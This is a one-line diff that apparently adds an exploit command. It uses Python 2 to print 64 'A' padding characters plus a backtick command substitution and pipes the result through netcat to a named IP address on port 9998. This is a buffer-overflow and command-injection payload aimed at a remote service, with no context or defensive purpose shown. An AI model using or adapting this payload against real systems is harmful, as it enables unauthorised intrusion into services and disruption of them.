@@ -1,0 +1,1 @@
+python -c 'print "A"*64 + "`echo $MSG`"' | nc 192.241.138.174 9998
